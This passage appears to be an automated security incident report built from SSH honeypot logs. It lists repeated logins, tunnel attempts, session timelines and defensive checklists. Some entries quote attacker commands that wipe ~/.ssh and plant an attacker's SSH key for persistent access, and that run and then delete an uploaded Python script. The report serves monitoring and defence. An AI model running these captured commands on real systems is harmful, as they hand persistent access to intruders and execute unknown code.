| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:21:00` | `cowrie.session.connect` |
| `2026-09-03 05:21:00` | `cowrie.client.version` |
| `2026-09-03 05:21:00` | `cowrie.client.kex` |
| `2026-09-03 05:21:01` | `cowrie.login.success` |
| `2026-09-03 05:21:01` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:21:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:21:01` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d0b55fe0bd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:24 |
| **Last Seen** | 2026-09-03 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:24:51` | `cowrie.session.connect` |
| `2026-09-03 05:24:51` | `cowrie.client.version` |
| `2026-09-03 05:24:51` | `cowrie.client.kex` |
| `2026-09-03 05:24:52` | `cowrie.login.success` |
| `2026-09-03 05:24:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:24:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:24:52` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba825497d92c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.147[.]239` |
| **First Seen** | 2026-09-03 05:26 |
| **Last Seen** | 2026-09-03 05:31 |
| **Session Duration** | 321s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:26:33` | `cowrie.session.connect` |
| `2026-09-03 05:26:53` | `cowrie.client.version` |
| `2026-09-03 05:26:53` | `cowrie.client.kex` |
| `2026-09-03 05:26:54` | `cowrie.login.success` |
| `2026-09-03 05:31:54` | `cowrie.session.file_upload` |
| `2026-09-03 05:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.147[.]239` to AbuseIPDB if not already reported
- [ ] Block `180.76.147[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c683b67b30

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:30 |
| **Last Seen** | 2026-09-03 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:30:31` | `cowrie.session.connect` |
| `2026-09-03 05:30:31` | `cowrie.client.version` |
| `2026-09-03 05:30:32` | `cowrie.client.kex` |
| `2026-09-03 05:30:32` | `cowrie.login.success` |
| `2026-09-03 05:30:33` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:30:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:30:33` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef44d4446ce

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:35 |
| **Last Seen** | 2026-09-03 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:35:46` | `cowrie.session.connect` |
| `2026-09-03 05:35:46` | `cowrie.client.version` |
| `2026-09-03 05:35:46` | `cowrie.client.kex` |
| `2026-09-03 05:35:47` | `cowrie.login.success` |
| `2026-09-03 05:35:47` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:35:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:35:47` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2754933e357

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 05:39 |
| **Last Seen** | 2026-09-03 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:39:25` | `cowrie.session.connect` |
| `2026-09-03 05:39:25` | `cowrie.client.version` |
| `2026-09-03 05:39:25` | `cowrie.client.kex` |
| `2026-09-03 05:39:25` | `cowrie.login.success` |
| `2026-09-03 05:39:26` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:39:26` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a30eeb6c6e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:40 |
| **Last Seen** | 2026-09-03 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:40:13` | `cowrie.session.connect` |
| `2026-09-03 05:40:13` | `cowrie.client.version` |
| `2026-09-03 05:40:13` | `cowrie.client.kex` |
| `2026-09-03 05:40:14` | `cowrie.login.success` |
| `2026-09-03 05:40:15` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:40:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:40:15` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e5211aa9b6

| Field | Detail |
|---|---|
| **Source IP** | `216.126.225[.]6` |
| **First Seen** | 2026-09-03 05:43 |
| **Last Seen** | 2026-09-03 05:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:43:53` | `cowrie.session.connect` |
| `2026-09-03 05:43:53` | `cowrie.client.version` |
| `2026-09-03 05:43:53` | `cowrie.client.kex` |
| `2026-09-03 05:43:53` | `cowrie.login.success` |
| `2026-09-03 05:43:54` | `cowrie.session.params` |
| `2026-09-03 05:43:54` | `cowrie.command.input` |
| `2026-09-03 05:43:54` | `cowrie.command.failed` |
| `2026-09-03 05:43:54` | `cowrie.log.closed` |
| `2026-09-03 05:43:55` | `cowrie.session.params` |
| `2026-09-03 05:43:55` | `cowrie.command.input` |
| `2026-09-03 05:43:55` | `cowrie.session.file_download` |
| `2026-09-03 05:43:55` | `cowrie.log.closed` |
| `2026-09-03 05:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.126.225[.]6` to AbuseIPDB if not already reported
- [ ] Block `216.126.225[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15543d9d4a6

| Field | Detail |
|---|---|
| **Source IP** | `216.126.225[.]6` |
| **First Seen** | 2026-09-03 05:43 |
| **Last Seen** | 2026-09-03 05:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:43:55` | `cowrie.session.connect` |
| `2026-09-03 05:43:55` | `cowrie.client.version` |
| `2026-09-03 05:43:55` | `cowrie.client.kex` |
| `2026-09-03 05:43:55` | `cowrie.login.success` |
| `2026-09-03 05:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.126.225[.]6` to AbuseIPDB if not already reported
- [ ] Block `216.126.225[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1772afa5b8d8

| Field | Detail |
|---|---|
| **Source IP** | `216.126.225[.]6` |
| **First Seen** | 2026-09-03 05:43 |
| **Last Seen** | 2026-09-03 05:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:43:55` | `cowrie.session.connect` |
| `2026-09-03 05:43:55` | `cowrie.client.version` |
| `2026-09-03 05:43:55` | `cowrie.client.kex` |
| `2026-09-03 05:43:56` | `cowrie.login.success` |
| `2026-09-03 05:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.126.225[.]6` to AbuseIPDB if not already reported
- [ ] Block `216.126.225[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15adb7b4ae8d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:46 |
| **Last Seen** | 2026-09-03 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:46:20` | `cowrie.session.connect` |
| `2026-09-03 05:46:20` | `cowrie.client.version` |
| `2026-09-03 05:46:20` | `cowrie.client.kex` |
| `2026-09-03 05:46:21` | `cowrie.login.success` |
| `2026-09-03 05:46:21` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:46:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:46:21` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d4888f95c3

| Field | Detail |
|---|---|
| **Source IP** | `168.107.19[.]29` |
| **First Seen** | 2026-09-03 05:46 |
| **Last Seen** | 2026-09-03 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:46:41` | `cowrie.session.connect` |
| `2026-09-03 05:46:41` | `cowrie.client.version` |
| `2026-09-03 05:46:41` | `cowrie.client.kex` |
| `2026-09-03 05:46:42` | `cowrie.login.success` |
| `2026-09-03 05:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.107.19[.]29` to AbuseIPDB if not already reported
- [ ] Block `168.107.19[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cad05f5cfaa

| Field | Detail |
|---|---|
| **Source IP** | `168.107.19[.]29` |
| **First Seen** | 2026-09-03 05:46 |
| **Last Seen** | 2026-09-03 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:46:41` | `cowrie.session.connect` |
| `2026-09-03 05:46:41` | `cowrie.client.version` |
| `2026-09-03 05:46:41` | `cowrie.client.kex` |
| `2026-09-03 05:46:42` | `cowrie.login.success` |
| `2026-09-03 05:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.107.19[.]29` to AbuseIPDB if not already reported
- [ ] Block `168.107.19[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8773432871

| Field | Detail |
|---|---|
| **Source IP** | `168.107.19[.]29` |
| **First Seen** | 2026-09-03 05:47 |
| **Last Seen** | 2026-09-03 05:48 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || { if command -v apt-get >/dev/null 2>&1; then apt-get update -y && apt-get install -y python3; elif command -v yum >/dev/null 2>&1; then yum install -y python3; elif command -v dnf >/dev/null 2>&1; then dnf install -y python3; fi; }, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:47:26` | `cowrie.session.connect` |
| `2026-09-03 05:47:27` | `cowrie.client.version` |
| `2026-09-03 05:47:27` | `cowrie.client.kex` |
| `2026-09-03 05:47:43` | `cowrie.login.success` |
| `2026-09-03 05:47:45` | `cowrie.session.file_upload` |
| `2026-09-03 05:47:46` | `cowrie.session.params` |
| `2026-09-03 05:47:46` | `cowrie.command.input` |
| `2026-09-03 05:47:46` | `cowrie.command.failed` |
| `2026-09-03 05:47:46` | `cowrie.command.failed` |
| `2026-09-03 05:47:46` | `cowrie.command.failed` |
| `2026-09-03 05:48:04` | `cowrie.session.params` |
| `2026-09-03 05:48:04` | `cowrie.command.input` |
| `2026-09-03 05:48:04` | `cowrie.log.closed` |
| `2026-09-03 05:48:05` | `cowrie.session.params` |
| `2026-09-03 05:48:05` | `cowrie.command.input` |
| `2026-09-03 05:48:05` | `cowrie.log.closed` |
| `2026-09-03 05:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.107.19[.]29` to AbuseIPDB if not already reported
- [ ] Block `168.107.19[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-599034654417

| Field | Detail |
|---|---|
| **Source IP** | `168.107.19[.]29` |
| **First Seen** | 2026-09-03 05:49 |
| **Last Seen** | 2026-09-03 05:49 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || { if command -v apt-get >/dev/null 2>&1; then apt-get update -y && apt-get install -y python3; elif command -v yum >/dev/null 2>&1; then yum install -y python3; elif command -v dnf >/dev/null 2>&1; then dnf install -y python3; fi; }, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:49:04` | `cowrie.session.connect` |
| `2026-09-03 05:49:05` | `cowrie.client.version` |
| `2026-09-03 05:49:08` | `cowrie.client.kex` |
| `2026-09-03 05:49:21` | `cowrie.login.success` |
| `2026-09-03 05:49:25` | `cowrie.session.file_upload` |
| `2026-09-03 05:49:26` | `cowrie.session.params` |
| `2026-09-03 05:49:26` | `cowrie.command.input` |
| `2026-09-03 05:49:26` | `cowrie.command.failed` |
| `2026-09-03 05:49:26` | `cowrie.command.failed` |
| `2026-09-03 05:49:26` | `cowrie.command.failed` |
| `2026-09-03 05:49:45` | `cowrie.session.params` |
| `2026-09-03 05:49:45` | `cowrie.command.input` |
| `2026-09-03 05:49:45` | `cowrie.log.closed` |
| `2026-09-03 05:49:46` | `cowrie.session.params` |
| `2026-09-03 05:49:46` | `cowrie.command.input` |
| `2026-09-03 05:49:47` | `cowrie.log.closed` |
| `2026-09-03 05:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.107.19[.]29` to AbuseIPDB if not already reported
- [ ] Block `168.107.19[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3f374dbe1e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:49 |
| **Last Seen** | 2026-09-03 05:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:49:28` | `cowrie.session.connect` |
| `2026-09-03 05:49:28` | `cowrie.client.version` |
| `2026-09-03 05:49:28` | `cowrie.client.kex` |
| `2026-09-03 05:49:29` | `cowrie.login.success` |
| `2026-09-03 05:49:29` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:49:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:49:29` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313bbec3448a

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]182` |
| **First Seen** | 2026-09-03 05:52 |
| **Last Seen** | 2026-09-03 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:52:18` | `cowrie.session.connect` |
| `2026-09-03 05:52:18` | `cowrie.login.success` |
| `2026-09-03 05:52:18` | `cowrie.session.params` |
| `2026-09-03 05:52:18` | `cowrie.command.input` |
| `2026-09-03 05:52:18` | `cowrie.command.input` |
| `2026-09-03 05:52:18` | `cowrie.command.failed` |
| `2026-09-03 05:52:18` | `cowrie.command.input` |
| `2026-09-03 05:52:18` | `cowrie.command.failed` |
| `2026-09-03 05:52:18` | `cowrie.command.input` |
| `2026-09-03 05:52:19` | `cowrie.log.closed` |
| `2026-09-03 05:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]182` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f281ee5984

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:57 |
| **Last Seen** | 2026-09-03 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:57:05` | `cowrie.session.connect` |
| `2026-09-03 05:57:05` | `cowrie.client.version` |
| `2026-09-03 05:57:05` | `cowrie.client.kex` |
| `2026-09-03 05:57:06` | `cowrie.login.success` |
| `2026-09-03 05:57:06` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:57:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:57:06` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46bfbbd0536d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:59 |
| **Last Seen** | 2026-09-03 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:59:04` | `cowrie.session.connect` |
| `2026-09-03 05:59:04` | `cowrie.client.version` |
| `2026-09-03 05:59:04` | `cowrie.client.kex` |
| `2026-09-03 05:59:05` | `cowrie.login.success` |
| `2026-09-03 05:59:06` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:59:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:59:06` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7afcedc0917f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:07 |
| **Last Seen** | 2026-09-03 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:07:56` | `cowrie.session.connect` |
| `2026-09-03 06:07:56` | `cowrie.client.version` |
| `2026-09-03 06:07:57` | `cowrie.client.kex` |
| `2026-09-03 06:07:57` | `cowrie.login.success` |
| `2026-09-03 06:07:58` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:07:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:07:58` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271884059bab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:08 |
| **Last Seen** | 2026-09-03 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:08:39` | `cowrie.session.connect` |
| `2026-09-03 06:08:39` | `cowrie.client.version` |
| `2026-09-03 06:08:39` | `cowrie.client.kex` |
| `2026-09-03 06:08:40` | `cowrie.login.success` |
| `2026-09-03 06:08:40` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:08:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:08:40` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e769670fe0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:17 |
| **Last Seen** | 2026-09-03 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:17:59` | `cowrie.session.connect` |
| `2026-09-03 06:17:59` | `cowrie.client.version` |
| `2026-09-03 06:17:59` | `cowrie.client.kex` |
| `2026-09-03 06:18:00` | `cowrie.login.success` |
| `2026-09-03 06:18:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:18:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:18:01` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aca11ba0ad3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:18 |
| **Last Seen** | 2026-09-03 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:18:28` | `cowrie.session.connect` |
